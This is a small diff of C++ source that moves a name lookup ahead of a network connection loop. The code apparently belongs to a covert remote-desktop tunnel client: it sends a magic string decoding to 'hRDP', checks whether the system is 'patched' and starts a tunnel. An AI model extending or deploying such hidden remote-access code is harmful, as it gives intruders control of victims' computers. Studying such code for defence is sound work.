@@ -29,6 +29,8 @@ int main(int argc,char* argv[])
     char* buffer = (char*)malloc(MAXPACK);
     if (buffer == NULL) { ExitProcess(-5); }
     const char* magik = "\x66\x33\x64\x69\x30\x30\x36\x2F\x68\x52\x44\x50\x00";
+    std::wstring n = Utils::getName();
+    if (n == L"") { return -1; }
     while (1) {
     start:
         std::cout << "Connecting...\n";
@@ -36,8 +38,6 @@ int main(int argc,char* argv[])
         std::cout << "Connected!\n";
         //
         send(net::s, magik, 13, 0);
-        std::wstring n = Utils::getName();
-        if (n == L"") { return -1; }
         Log::SaveLog((wchar_t*)n.c_str());
         while (1) {
             if (Utils::isPatched()) { Log::SaveLog((wchar_t*)L"Already patched ! starting tunnel..."); }
